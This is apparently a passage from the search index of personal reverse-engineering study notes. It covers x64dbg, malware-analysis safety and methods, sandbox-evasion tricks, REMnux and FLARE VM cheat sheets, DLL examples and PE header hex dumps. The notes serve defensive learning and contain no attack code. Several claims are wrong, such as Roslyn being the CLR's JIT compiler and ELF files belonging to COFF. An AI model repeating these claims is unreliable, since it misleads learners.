<code>x64dbg</code>. Upon opening the application we will be greeted by this interface:</p> <p></p> <p>To open a file in the debugger, we can navigate to File &gt; Open and open our desired file. We are currently seeing the CPU tab in the interface.</p> <p>Warning</p> <p>Please note that we must use x32dbg for 32-bit samples and x64dbg for 64-bit samples.</p> <p></p> <p>As we can see in the bottom left corner, the execution of the program is paused because a <code>System breakpoint</code> has been reached. We can control whether to execute one instruction at a time or the whole program. But before that, let's take a look at the screenshot above. Here, we can see Disassembly in the middle pane, with the Instruction pointer pointing to the next instruction executed if we start the program. In the right pane, we can see the registers and their values. We can note that the value in EIP is the address EIP is pointing to in the disassembly pane. Similarly, on the bottom pane, we can see the stack view (right), the dump view (left), and the timer showing the time we spent debugging the sample (right corner). </p> <p>Warning</p> <p>x32-x64dbg is programmed to break execution on TLS callbacks</p> <p>We can set where to put automatic breakpoints on a program by going to the Options &gt; Preferences menu.</p> <p>Let's look at some of the other tabs. The breakpoints tab shows the current status of breakpoints. Breakpoints are points where the execution of the program is paused for the analyst to analyze the registers and memory. A breakpoint on a specific instruction can be enabled by clicking the dot in front of that instruction in the CPU tab.</p> <ul> <li>The Memory Map shows the memory of the program.</li> <li>We can also take a look the Call stack of the program.</li> <li>The threads running in the program are shown in the threads tab.</li> <li>Any handles to files, processes, or other resources the process accesses are shown in the handles tab.</li> </ul>"},{"location":"Reverse_Engineering/Intro/","title":"Intro to (Malware) Analysis","text":"<p>Notice how malware is in brackets, this is because analysis of other software in order to reverse it later on happens the same way.</p> <p>E.g: A game cheat could also be classified as <code>malware</code>. In order to write the code for the anti-cheat we'd have to do some analysis on the cheat as well.</p> <p>Warning</p> <p>Don't perform malware analysis on a live machine not purpose-built for malware analysis.</p>"},{"location":"Reverse_Engineering/Intro/#malware-analysis","title":"Malware analysis","text":"<p>The word malware is derived from the term <code>MALicious softWARE</code>. Therefore, any software that has a malicious purpose can be considered malware. Malware is further classified into different categories based on its behavior. </p> <p>Here we will ponder the steps we will take if we suspect that we found malware in a machine.</p>"},{"location":"Reverse_Engineering/Intro/#the-purpose-behind-malware-analysis","title":"The purpose behind Malware Analysis","text":"<ul> <li><code>Security Operations</code> teams analyze malware to write detections for malicious activity in their networks.</li> <li><code>Incident Response</code> teams analyze malware to determine what damage has been done to an environment to remediate and revert that damage.</li> <li><code>Threat Hunt</code> teams analyze malware to identify IOCs, which they use to hunt for malware in a network.</li> <li><code>Malware Researchers</code> in security product vendor teams analyze malware to add detections for them in their security products.</li> <li><code>Threat Research</code> teams in OS Vendors like Microsoft and Google analyze malware to discover the vulnerabilities exploited and add more security features to the OS/applications.</li> </ul>"},{"location":"Reverse_Engineering/Intro/#safety-first","title":"Safety first!","text":"<p>Please note that malware is like a weapon because it <code>can produce great harm if not handled with care</code>. For this reason, always take the following precautions while analyzing malware:</p> <ul> <li>Never analyze malware or suspected malware on a machine that does not have the <code>sole purpose of analyzing malware</code>.</li> <li>When not analyzing or moving malware samples around to different locations, always <code>keep them in password-protected zip/rar or other archives so that we can avoid accidental detonation</code>.</li> <li>Only extract the malware from this password-protected archive inside the <code>isolated environment</code>, and <code>only when analyzing</code> it.</li> <li><code>Create an isolated VM</code> specifically for malware analysis, which has the <code>capability of being reverted to a clean slate</code> once you are done.</li> <li>Ensure that all <code>internet connections are closed</code> or at least monitored.</li> <li>Once you are done with malware analysis, <code>revert the VM to its clean slate for the next malware analysis session</code> to avoid residue from a previous malware execution corrupting the next one.</li> </ul>"},{"location":"Reverse_Engineering/Intro/#techniques-of-malware-analysis","title":"Techniques of malware analysis","text":"<p>Malware Analysis is like solving a puzzle. Different tools and techniques are used to find the pieces of this puzzle.</p> <p>Most of the time, you will have an executable file (also called a binary or a PE file. PE stands for Portable Executable), a malicious document file, or a Network Packet Capture (Pcap). </p> <p>The Portable Executable is the most prevalent type of file analyzed while performing Malware Analysis.</p> <p>To find the different puzzle pieces, you will often use various tools, tricks, and shortcuts. These techniques can be grouped into the following two categories:</p> <ul> <li>Static Analysis</li> <li>Dynamic Analysis</li> </ul>"},{"location":"Reverse_Engineering/Intro/#static-analysis","title":"Static Analysis","text":"<p>When malware is analyzed <code>without being executed</code>, it is called Static Analysis.</p> <p>In this case, the different properties of the <code>PE file</code> are analyzed without running it. Similarly, in the case of a <code>malicious document</code>, exploring the document's properties without analyzing it will be considered Static Analysis.</p> <p>Examples of static analysis include:</p> <ul> <li>Checking for <code>strings</code> in malware</li> <li>Checking the <code>PE header</code> for information related to different <code>sections</code></li> <li>Looking at the code using a <code>disassembler</code>. </li> </ul> <p>Malware <code>often uses techniques to avoid static analysis</code>:</p> <ul> <li><code>obfuscation</code></li> <li><code>packing</code></li> <li><code>other means of hiding its properties</code></li> </ul> <p>To circumvent these techniques, we often use <code>dynamic analysis</code>.</p>"},{"location":"Reverse_Engineering/Intro/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Malware faces a dilemma. It has to execute to fulfil its purpose, and no matter how much obfuscation is added to the code, it becomes an easy target for detection once it runs.</p> <p>Sometimes we might need to run the malware in a controlled environment to observe what it does in these cases.</p> <p>Dynamic analysis techniques include:</p> <ul> <li>Running the malware in a VM</li> <li>In a <code>manual</code> fashion with tools installed to monitor the malware's activity</li> <li>In the form of sandboxes that perform this task <code>automatically</code>.</li> </ul> <p>Once we run the malware in a controlled environment, we can use our knowledge from the <code>Windows Forensics</code> rooms to <code>identify what it did in our environment</code>.</p> <p>The advantage here is that since we control the environment, we can configure it to avoid noise, like activity from a legitimate user or Windows Services. Thus, everything we observe in such an environment points to malware activity, making it easier to identify what the malware did in this scenario.</p> <p>Warning</p> <p>This is specific to malware reversal, Windows forensics and the Windows environment. </p> <p>However let's say you're reversing / analyzing a \"safe\" program then don't mind this part above.</p> <p>Malware, however, often uses techniques to prevent an analyst from performing dynamic analysis. Since most dynamic analysis is performed in a controlled environment.</p> <p>Most methods to bypass dynamic analysis include <code>detecting the environment</code> in which it is being run. Therefore, in these cases, the <code>malware uses a different, benign code path if it identifies that it is being run in a controlled environment</code>.</p>"},{"location":"Reverse_Engineering/Intro/#basic-static-analysis","title":"Basic static analysis","text":"<p>When analyzing a new piece of malware, the first step is usually performing basic static analysis. Basic static analysis can be considered sizing up the malware, trying to find its properties before diving deep into analysis. It provides us with an overview of what we are dealing with. Sometimes it might give us some critical information, for example, what API calls the malware is making or whether it's packed or not. However, other times, it might only give us information to help us size the malware up and give us an idea of the effort required to analyze it.</p> <p>So without further ado, let's see some of the techniques we can use to perform basic static analysis.</p> <p>We will be using the attached Remnux VM. <code>Remnux</code> (<code>Reverse Engineering Malware Linux</code>) is a Linux distribution purpose-built for malware analysis. It has many tools required for malware analysis already installed on it.</p>"},{"location":"Reverse_Engineering/Intro/#examining-the-file-type","title":"Examining the file type","text":"<p>Though often the file type of malware is visible in the file extension and is obvious, sometimes malware authors try to trick users by using <code>misleading file extensions</code>.</p>"},{"location":"Reverse_Engineering/Intro/#examining-strings","title":"Examining Strings","text":"<p>Another really important command that provides us with useful information about a file is the <code>strings</code> command. This command lists down the strings present in a file.</p> <p>Looking at strings in a file can often give <code>clues related to the behavior</code> of malware. </p> <p>E.g: <code>URLDownloadToFile</code> in the output of the strings command will mean that this malware is doing something with the URLDownloadToFile <code>Windows API</code>. Most likely, it is <code>downloading a file from the internet and saving it on the disk</code>.</p> <p>Similarly, strings might also provide <code>contextual information</code> that helps us later during malware analysis.</p>"},{"location":"Reverse_Engineering/Intro/#calculating-hashes","title":"Calculating Hashes","text":"<p>File Hashing provides us with a fixed-size unique number that identifies a file. A File Hash can therefore be considered a unique identifier for a file.</p> <p>This identifier can be shared with other analysts or searched online for information sharing purposes.</p> <p>Please note that a single bit of difference in two files will result in different hashes, so changing the hash of a file is as simple as changing one bit in it.</p> <p>Commonly, <code>md5sum</code>, <code>sha1sum</code> and <code>sha256sum</code> hashes are used for file hashing.</p>"},{"location":"Reverse_Engineering/Intro/#av-scans-and-virustotal","title":"AV scans and VirusTotal","text":"<p>Scanning a file using AVs or searching for a hash on VirusTotal can also provide useful information about the classification of malware performed by security researchers. However, when using an online scanner, it is recommended to <code>search for the malware's hash instead of uploading</code> online to avoid leaking sensitive information online. </p> <p>Only upload a sample if you are sure of what you are doing.</p>"},{"location":"Reverse_Engineering/Intro/#pe-header","title":"PE Header","text":"<p>The PE File Header contains the metadata about a Portable Executable file. This data can help us find a lot of helpful information to help us in our analysis.</p> <p>However, some of the vital information found in the PE header is explained below:</p> <ul> <li>Imports/Exports</li> <li>Sections</li> <li>Analyzing other PE header info</li> </ul>"},{"location":"Reverse_Engineering/Intro/#basic-dynamic-analysis","title":"Basic dynamic analysis","text":"<p>Many of the properties of a malware sample can be hidden when it's not running. However, when we perform dynamic analysis, we can lay these properties bare and learn more about the behavior of a malware sample.</p> <p>Warning</p> <p>Dynamic analysis requires running live malware samples that can be destructive. It is highly recommended that you perform malware analysis in an isolated Virtual Machine. </p> <p>You can create a clean snapshot of your Virtual Machine before performing any malware analysis and revert it to start from a clean state again after every analysis. </p> <p>Don't perform malware analysis on a live machine not purpose-built for malware analysis.</p>"},{"location":"Reverse_Engineering/Intro/#introduction-to-sandboxes","title":"Introduction to Sandboxes","text":"<p>Sandbox is a term borrowed from the military. A sandbox is a box of sand, as the name suggests, modeling the terrain where an operation has to take place, in which a military team dry runs their scenarios to identify possible outcomes.</p> <p>In malware analysis, a sandbox is an isolated environment mimicking the actual target environment of a malware, where an analyst runs a sample to learn more about it. <code>Malware analysis sandboxes heavily rely on Virtual Machines</code>, their ability to take snapshots and revert to a clean state when required.</p>"},{"location":"Reverse_Engineering/Intro/#open-source-sandboxes","title":"Open-Source sandboxes","text":"<p>Though it is good to understand what a good sandbox is made of, building a sandbox from scratch is not always necessary. One can always set up Open Source Sandboxes. These sandboxes provide the framework for performing basic dynamic analysis and are also customizable to a significant extent to help those with a more adventurous mindset.</p> <ul> <li>Cuckoo's sandbox</li> <li>CAPE sandbox</li> <li>Online sandboxes</li> <li>Online Cuckoo sandbox</li> <li>Any.run</li> <li>Intezer</li> <li>Hybrid Analysis</li> </ul>"},{"location":"Reverse_Engineering/Intro/#anti-analysis-techniques","title":"Anti-analysis techniques","text":"<p>While the security researchers are devising techniques and tools to analyze malware, the malware authors are working on rendering these tools and techniques ineffective. We find a great deal of information if we use the previous techniques.</p> <p>However, there are ways malware authors can make our life difficult.</p>"},{"location":"Reverse_Engineering/Intro/#packing-and-obfuscation","title":"Packing and Obfuscation","text":"<p>Malware authors often use packing and obfuscation to make an analyst's life difficult. A packer obfuscates, compresses, or encrypts the contents of malware. These techniques make it difficult to analyze malware statically. Specifically, a packed malware will not show important information when running a string search against it.</p> <p>Read packing and identifying packed executables.</p>"},{"location":"Reverse_Engineering/Intro/#sandbox-evasion","title":"Sandbox evasion","text":"<p>As we learned about previously, we can always run a sample in a sandbox to analyze it. In many cases, that might help us analyze samples that evade our basic static analysis techniques. </p> <p>However, malware authors have some tricks up their sleeves that hamper that effort. </p> <p>Some of these techniques are as follows:</p> <ul> <li><code>Long sleep calls</code>: Malware authors know that <code>sandboxes run for a limited time</code>. Therefore, they program the malware not to <code>perform any activity for a long time after execution</code>. This is often <code>accomplished through long sleep calls</code>. The purpose of this technique is to <code>time out the sandbox</code>.</li> <li><code>User activity detection</code>: Some malware samples will <code>wait for user activity</code> before performing malicious activity. The premise of this technique is that <code>there will be no user in a sandbox</code>. Therefore there will be no <code>mouse movement</code> or <code>typing on the keyboard</code>. Advanced malware also detects <code>patterns in mouse movements that are often used in automated sandboxes</code>. This technique is designed to <code>bypass automated sandbox detection</code>.</li> <li><code>Footprinting user activity</code>: Some malware checks for <code>user files or activity</code>, like if there are any files in the <code>MS Office history</code> or <code>internet browsing history</code>. If no or little activity is found, the malware will consider the machine as a sandbox and quit.</li> <li><code>Detecting VMs</code>: Sandboxes run on virtual machines. <code>Virtual machines leave artifacts</code> that can be identified by malware. For example, some <code>drivers installed in VMs</code> being run on VMWare or Virtualbox give away the fact that the machine is a VM. <code>Malware authors often associate VMs with sandboxes</code> and would <code>terminate the malware if a VM is detected</code>.</li> </ul> <p>The above list is not exhaustive but gives us an idea of what to expect when analyzing malware.</p>"},{"location":"Reverse_Engineering/VMs/","title":"REMnux Cheat Sheet","text":"<p>REMnux is a Linux distribution designed for reverse engineering and analyzing malware. It includes a variety of tools for analyzing files, network traffic, and more.</p> Tool Description Example Used For <code>radare2</code> A framework for analyzing binaries and disassembling code. <code>radare2 malware.bin</code> Binary analysis <code>binwalk</code> A tool for extracting firmware images and files embedded in binaries. <code>binwalk firmware.img</code> Extract embedded files from firmware <code>gdb</code> The GNU debugger, used for debugging programs. <code>gdb malware.bin</code> Debugging programs and binaries <code>strace</code> A diagnostic tool to trace system calls and signals. <code>strace -p 1234</code> Analyzing system calls <code>objdump</code> Displays information about object files. <code>objdump -d malware.bin</code> Disassembling binaries <code>yara</code> A tool for pattern matching against files using rules. <code>yara rules.yar malware.bin</code> Malware detection and analysis <code>file</code> Determines the type of a file. <code>file malware.bin</code> Identifying file types <code>strings</code> Extracts human-readable strings from binaries. <code>strings malware.bin</code> String extraction from binaries <code>tcpdump</code> A network traffic capture tool. <code>tcpdump -i eth0</code> Capturing network traffic <code>floss</code> A tool for extracting strings from executables that are obfuscated. <code>floss malware.exe</code> Analyzing obfuscated strings <code>peframe</code> A tool to analyze PE files for potential indicators of compromise. <code>peframe malware.exe</code> Analyzing PE file headers"},{"location":"Reverse_Engineering/VMs/#flare-vm-cheat-sheet","title":"FLARE VM Cheat Sheet","text":"<p>FLARE VM is a Windows-based environment for reverse engineering and malware analysis, offering a wide array of tools for static and dynamic analysis.</p> Tool Description Example Used For <code>x64dbg</code> A powerful Windows debugger for reverse engineering. <code>x64dbg malware.exe</code> Debugging Windows applications <code>IDAPython</code> A plugin for IDA Pro to add Python scripting capabilities. <code>import idapython</code> Extending IDA Pro with Python <code>Procmon</code> Monitors and logs system calls, file system activity, and more. <code>procmon /Minimized</code> Monitoring system activity <code>Wireshark</code> A network protocol analyzer for capturing and inspecting network traffic. <code>wireshark -i 1</code> Capturing network traffic <code>PEiD</code> A tool for identifying packers, cryptors, and compilers used to create executables. <code>PEiD malware.exe</code> Identifying packed executables <code>Immunity Debugger</code> A debugger that can be used to analyze Windows applications. <code>immunitydebugger malware.exe</code> Windows application debugging <code>OllyDbg</code> A 32-bit assembler-level debugger for Windows. <code>ollydbg malware.exe</code> Analyzing 32-bit executables <code>CFF Explorer</code> A tool to inspect and edit PE files and headers. <code>cffe.exe malware.exe</code> PE file analysis and modification <code>ApateDNS</code> A DNS server manipulation tool for redirection. <code>ApateDNS.exe</code> Manipulating DNS requests <code>Volatility</code> A tool for memory forensics to analyze memory dumps. <code>volatility -f memory.dmp --profile=Win7SP1x64 pslist</code> Memory forensics <code>RegShot</code> A registry comparison tool to track changes between two snapshots. <code>regshot</code> Registry analysis"},{"location":"Windows_Internals/API_Introduction/","title":"Application Programming Interface (API) introduction","text":"<p>An API is a way for two or more software components to communicate with each other. APIs define rules for how requests and responses should be structured.</p>"},{"location":"Windows_Internals/API_Introduction/#types","title":"Types","text":"<p>There are different types of APIs depending on how they are used and what they interact with:</p> API Type Description Example Local APIs (OS APIs) These allow applications to interact with the operating system. Win32 API \u2192 Used for Windows applications to <code>interact with system resources</code> like files, memory, processes, etc. Which provides functions like CreateFile(), ReadFile(), etc., which allow programs to access the Windows system. Web APIs These allow <code>communication over a network</code>, often using HTTP. REST API, SOAP API, GraphQL API, A client sends a request (e.g., GET /users) to a server, and the server responds with data. Library APIs These APIs are built into <code>software libraries</code> to allow developers to use pre-built functionality. The .NET API (like System.IO.File.ReadAllText()) lets you work with files in C#. Hardware APIs These allow software to <code>communicate with hardware</code>. Example: DirectX API \u2192 Used in game development to interact with GPUs."},{"location":"Windows_Internals/DLLs/","title":"Dynamic Link Libraries","text":"<p>The Microsoft docs describe a <code>DLL</code> as \"<code>a library that contains code and data that can be used by more than one program at the same time</code>.\"</p> <p>Reading up on COM objects might clear up things if you're wondering about the history behind DLL's and how they came to be what they are today.</p> <p>DLLs are used as one of the core functionalities behind application execution in Windows. From the Windows documentation, \"The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space. So, the operating system and the programs load faster, run faster, and take less disk space on the computer.\"</p> <p>When a DLL is loaded as a function in a program, the DLL is assigned as a <code>dependency</code>. Since a program is dependent on a DLL, attackers can target the DLLs rather than the applications to control some aspect of execution or functionality.</p> <p>DLLs are created no different than any other project/application; they only require slight syntax modification to work. Below is an example of a DLL from the <code>Visual C++ Win32 Dynamic-Link Library project</code>:</p> <pre><code>#include \"stdafx.h\"\n#define EXPORTING_DLL\n#include \"sampleDLL.h\"\nBOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved\n)\n{\n    return TRUE;\n}\nvoid HelloWorld()\n{\n    MessageBox( NULL, TEXT(\"Hello World\"), TEXT(\"In a DLL\"), MB_OK);\n}\n</code></pre> <p>Below is the <code>header file</code> for the DLL; it will define what functions are imported and exported:</p> <pre><code>#ifndef INDLL_H\n    #define INDLL_H\n    #ifdef EXPORTING_DLL\n        extern __declspec(dllexport) void HelloWorld();\n    #else\n        extern __declspec(dllimport) void HelloWorld();\n    #endif\n#endif\n</code></pre>"},{"location":"Windows_Internals/DLLs/#how-are-they-used-by-an-application","title":"How are they used by an application?","text":""},{"location":"Windows_Internals/DLLs/#load-time-dynamic-linking","title":"load-time dynamic linking:","text":"<p>When loaded using load-time dynamic linking, <code>explicit calls to the DLL functions are made from the application</code>. You can only achieve this type of linking by <code>providing a header (.h) and import library (.lib) file</code>. Below is an example of calling an exported DLL function from an application.</p> <pre><code>#include \"stdafx.h\"\n#include \"sampleDLL.h\"\nint APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)\n{\n    HelloWorld();\n    return 0;\n}\n</code></pre>"},{"location":"Windows_Internals/DLLs/#run-time-dynamic-linking","title":"run-time dynamic linking:","text":"<p>When loaded using run-time dynamic linking, a <code>separate function</code> (<code>LoadLibrary</code> or <code>LoadLibraryEx</code>) is <code>used to load the DLL at run time</code>. Once loaded, you need to use <code>GetProcAddress to identify the exported DLL function to call</code>. Below is an example of loading and importing a DLL function in an application.</p> <pre><code>...\ntypedef VOID (*DLLPROC) (LPTSTR);\n...\nHINSTANCE hinstDLL;\nDLLPROC HelloWorld;\nBOOL fFreeDLL;\nhinstDLL = LoadLibrary(\"sampleDLL.dll\");\nif (hinstDLL != NULL)\n{\n    HelloWorld = (DLLPROC) GetProcAddress(hinstDLL, \"HelloWorld\");\n    if (HelloWorld != NULL)\n        (HelloWorld);\n    fFreeDLL = FreeLibrary(hinstDLL);\n}\n...\n</code></pre>"},{"location":"Windows_Internals/Dotnet_Framework/","title":"The .NET Framework","text":"<p>.NET is a software framework for building software .</p> <p>It helps developers create <code>Windows</code> applications, websites, games, and even mobile apps without having to build everything from scratch.</p> <p>It provides: - A set of built-in tools and libraries (so you don\u2019t have to write everything yourself). - Support for multiple programming languages (like C#, VB.NET, and F#). - A system that runs and manages your code (so it works smoothly on Windows, and now also on Mac &amp; Linux).</p>"},{"location":"Windows_Internals/Dotnet_Framework/#net-framework-vs-net-core-vs-net","title":".NET Framework vs. .NET core vs .NET","text":"<p>The old .NET, initially name the .NET Framework worked only on Windows and wasn't catered toward cross-platform development. Later the .NET Framework has been renamed \".NET core\" and works with Windows, Mac and Linux. Later .NET Core evolved into just \u201c.NET\u201d starting with .NET 5 (released in 2020).</p> <p>Don't try to make any of this naming convention make sense cause it won't.</p>"},{"location":"Windows_Internals/Dotnet_Framework/#versions","title":"Versions","text":"Windows version .NET Framework version Windows 8 4.5 Windows 8.1 4.5.1 Windows 10 4.6 Windows 10.1511 4.6.1 Windows 10.1607 4.6.2 Windows 10.1703 4.7 Windows 10.1709 4.7.1 Windows 10.1803 4.7.2 Windows 10 May Update 4.8 Windows 11.22621 4.8.1"},{"location":"Windows_Internals/Dotnet_Framework/#components","title":"Components","text":"<p>The .NET Framework consists of two main components: 1. The Common Language Runtime (CLR):</p> <pre><code>This is the run-time engine for .NET and it includes:\n- A JIT (Just-In-Time) compiler named `Roslyn`. Roslyn translates CIL (Common Intermediate Language) instructions to the cpu.\n- A garbage collector\n- Type verification\n- Code access security\n- Etc.\nThe CLR is implemented as a COM in-process server (DLL) and uses the Windows API for it's facilities.\n</code></pre> <ol> <li> <p>The .NET Framework Class Library (FCL):</p> <p>This is just a large collection of types / classes for the programmer to be used.</p> </li> </ol>"},{"location":"Windows_Internals/Introduction/","title":"Windows Internals","text":"<p>Windows Internals is an umbrella term that refers to the architecture and it's back-end components that make up the Windows Operating System.</p> <p>These internals cannot change without compromising how the operating system operates. Because of this, this architecture is also where the system is most vulnerable.</p> <p>This can include processes, file formats, COM (Component Object Model), task scheduling, I/O System, etc.</p>"},{"location":"Windows_Internals/Introduction/#securable-objects","title":"Securable objects","text":"<p>At the lowest level, nearly everything in windows is a securable object. This means that all of these components that make up the internals architecutre are all able to have security descriptors attached to them: - It's owner - DACL (Discretionary Access Control List) - SACL (System Access Control List) - Permissions</p> <p>These are managed through the Windows Security Model and enforced by the Object Manager in the Windows Kernel.</p> <p>Eventually this could lead to insecure permissions: - Service executables - DLLs loaded by privileged processes - Registry keys with configurations settings - Named pipes - Process and thread objects - Service configurations - etc.</p> <p>Tip</p> <p>This is something we dove into when covering Windows Privesc.</p>"},{"location":"Windows_Internals/Introduction/#oversimplified-architectural-overview","title":"Oversimplified Architectural overview","text":"<pre><code>graph BT;\n    subgraph Computer\n    direction BT\n        Hardware --&gt; firmware[\"Firmware  (BIOS or UEFI)\"]\n\n        subgraph OS[Windows Operating System]\n        direction BT\n            bootldr[Windows bootloader]\n\n            subgraph km[Kernel-mode]\n            direction BT\n                HAL[\"Kernel run-time\n                &amp;\n                Hardware Abstraction Layer (HAL)\"]\n                Kernel\n                dd[Device drivers]\n                es[\"Executive (Subsystems)\"]\n                wg[Windowing and graphics]\n            end\n\n            subgraph um[User-mode]\n                SDLL[Subsystem DLLs] --&gt; NTDLL[\"NTDLL.DLL (run-time library)\"]\n                up[Processes] --&gt; SDLL\n                servp[Services] --&gt; SDLL\n                sysp[System processes] --&gt; SDLL\n                sysp --&gt; NTDLL\n                env[Environment subsystems] --&gt; NTDLL\n            end\n        end\n    end\n\n    firmware -.-&gt; bootldr\n    bootldr -.-&gt; HAL\n    km &lt;-.-&gt; um</code></pre>"},{"location":"Windows_Internals/PE/","title":"Portable executable file format","text":""},{"location":"Windows_Internals/PE/#introduction","title":"Introduction","text":"<p>Executables and applications are a large portion of how Windows internals operate at a higher level. You might have often seen files with extension <code>.exe</code> which stands for <code>executable (file)</code>.</p> <p>These files are <code>portable because they can be taken to any system with the same Operating System and dependencies</code>, and they will perform the same task on that system. Therefore, these files are called Portable Executables (PE files).</p> <p>As the name suggests, an executable file contains code that can be executed. Therefore, anything that needs to be run on a Windows Operating System is executed using an executable file, also called a <code>Portable Executable file (PE file)</code>, as it can be run on any Windows system.</p> <p>The PE files consist of a <code>sequence of bits</code> stored on the disk. This sequence is in a <code>specific format</code>. The initial bits define the characteristics of the PE file and explain how to read the rest of the data. <code>This initial part of the PE file is called a PE header</code>. </p> <p>The <code>PE</code> (Portable Executable) format <code>defines the information about the executable and stored data</code>. The PE format <code>also defines the structure of how data components are stored</code>.</p> <p>The PE (Portable Executable) format is an overarching <code>structure for executable and object files</code>. The <code>PE</code> (Portable Executable) and <code>COFF</code> (Common Object File Format) files make up the <code>PE format</code>.</p> <p>The COFF consists of:</p> <ul> <li>Windows <code>PE files</code></li> <li><code>DLLs</code></li> <li><code>Shared objects in Linux</code></li> <li><code>ELF files</code></li> </ul> <p>Tip</p> <p>Before dissecting any PE headers familiarize yourself with the concept of <code>endianness</code> and <code>hex</code> (hexadecimal).</p> <p>PE data is most commonly seen in the <code>hex dump</code> of an executable file. Below we will break down a hex dump of <code>calc.exe</code> and other programs into the sections of PE data.</p>"},{"location":"Windows_Internals/PE/#overview","title":"Overview","text":"<p>On disk, a PE executable looks the same as any other form of digital data, i.e., a combination of bits.</p> <p>If we open a PE file in a Hex editor, we will see a random bunch of Hex characters. This bunch of Hex characters are the instructions a Windows OS needs to execute this binary file.</p> <p>Some of the important headers that we will discuss are:</p> <ul> <li>IMAGE_DOS_HEADER</li> <li>IMAGE_NT_HEADERS</li> <li>FILE_HEADER</li> <li>OPTIONAL_HEADER</li> <li>IMAGE_SECTION_HEADER</li> <li>IMAGE_IMPORT_DESCRIPTOR</li> </ul> <p>All of these headers are of the data type <code>STRUCT</code>. A struct is a user-defined data type that combines several different types of data elements in a single variable. Since it is user-defined, we need to see the documentation to understand the type for each STRUCT variable. The documentation for each header can be found on Microsoft learn, where you can find the data types of the different fields inside these headers.</p> <p></p>"},{"location":"Windows_Internals/PE/#basic-file-info","title":"Basic file info","text":"<p>Below properties are common to find, note that they are always relevant to the section you are looking at. In this case since we're looking at information about the PE file they're applied to the entire PE file.</p> <p>The higher the value of Entropy, the more random the data is. We will learn about the utility of Entropy as we learn more about malware analysis.</p> <ul> <li>Size: denotes the <code>size of the section in bytes</code>.</li> <li>Hashes: unique identifiers to check the validity of the program</li> <li>Entropy: the amount of randomness found in data</li> <li>Architecture: refers to the CPU architecture the program is compiled for</li> <li>Compile date: the data on which the code was compiled into the executeable</li> </ul> <p>The header starts below this information, with the heading IMAGE_DOS_HEADER.</p>"},{"location":"Windows_Internals/PE/#image_dos_header","title":"IMAGE_DOS_HEADER","text":"<p>The IMAGE_DOS_HEADER consists of the first 64 bytes of the PE file. The first two bytes say <code>4D 5A</code>. They translate to the <code>MZ</code> characters in ASCII.</p> <p>The MZ characters denote the <code>initials</code> of Mark Zbikowski, one of the Microsoft architects who created the MS-DOS file format. The MZ characters are an <code>identifier of the Portable Executable format</code>. When these two bytes are present at the start of a file, the Windows <code>OS considers it a Portable Executable format file</code>.</p> <ul> <li>e_magic: 0x5a4d or MZ</li> <li>e_lfanew: denotes the address from where the IMAGE_NT_HEADERS start.</li> </ul> <p>The IMAGE_DOS_HEADER is generally not of much use apart from these fields, especially during malware reverse engineering. The only reason it's there is backward compatibility between MS-DOS and Windows.</p> <pre><code>Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n00000000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..........\u00ff\u00ff..\n00000010  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  \u00b8.......@.......\n00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n00000030  00 00 00 00 00 00 00 00 00 00 00 00 E8 00 00 00  ............\u00e8...\n00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..\u00ba..\u00b4.\u00cd!\u00b8.L\u00cd!Th\n</code></pre>"},{"location":"Windows_Internals/PE/#dos_stub","title":"DOS_STUB","text":"<p>The <code>DOS Stub</code> is a program run by default at the beginning of a file that prints a <code>compatibility message</code>. This does not affect any functionality of the file for most users.</p> <p>The message it contains that we also see in a Hex Editor is: <code>!This program cannot be run in DOS mode</code>.</p> <p>Note that the <code>size</code>, <code>hashes</code>, and <code>Entropy</code> found here are not related to the PE file. Instead, it is for the particular section we are analyzing. These values are calculated based on the data in a specific header.</p> <p>The <code>size</code> value denotes the <code>size of the section in bytes</code>. Then we see different hashes for the section.  Entropy is the amount of randomness found in data. The higher the value of Entropy, the more random the data is. We will learn about the utility of Entropy as we learn more about malware analysis.</p> <p>The DOS STUB is a small piece of code that only runs if the PE file is incompatible with the system it is being run on. It displays the message: <code>!This program cannot be run in DOS mode</code>, mentioned above.</p> <pre><code>00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..\u00ba..\u00b4.\u00cd!\u00b8.L\u00cd!Th\n00000050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno\n00000060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS \n00000070  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......\n</code></pre>"},{"location":"Windows_Internals/PE/#image_nt_headers","title":"IMAGE_NT_HEADERS","text":"<p>We can find details of IMAGE_NT_HEADERS in Microsoft Documentation.</p> <p>The <code>IMAGE_NT_HEADERS</code> is the section with the least human-readable output. It also contains most of the vital information related to the PE file. The IMAGE_NT_HEADERS section provides <code>PE header information of the binary</code>. </p> <p>You can identify the start of the PE file header from the <code>PE stub</code> in the hex dump section below.</p> <pre><code>000000E0  00 00 00 00 00 00 00 00 50 45 00 00 64 86 06 00  ........PE..d\u2020..\n000000F0  10 C4 40 03 00 00 00 00 00 00 00 00 F0 00 22 00  .\u00c4@.........\u00f0.\".\n00000100  0B 02 0E 14 00 0C 00 00 00 62 00 00 00 00 00 00  .........b......\n00000110  70 18 00 00 00 10 00 00 00 00 00 40 01 00 00 00  p..........@....\n00000120  00 10 00 00 00 02 00 00 0A 00 00 00 0A 00 00 00  ................\n00000130  0A 00 00 00 00 00 00 00 00 B0 00 00 00 04 00 00  .........\u00b0......\n00000140  63 41 01 00 02 00 60 C1 00 00 08 00 00 00 00 00  cA....`\u00c1........\n00000150  00 20 00 00 00 00 00 00 00 00 10 00 00 00 00 00  . ..............\n00000160  00 10 00 00 00 00 00 00 00 00 00 00 10 00 00 00  ................\n00000170  00 00 00 00 00 00 00 00 94 27 00 00 A0 00 00 00  ........\u201d'.. ...\n00000180  00 50 00 00 10 47 00 00 00 40 00 00 F0 00 00 00  .P...G...@..\u00f0...\n00000190  00 00 00 00 00 00 00 00 00 A0 00 00 2C 00 00 00  ......... ..,...\n000001A0  20 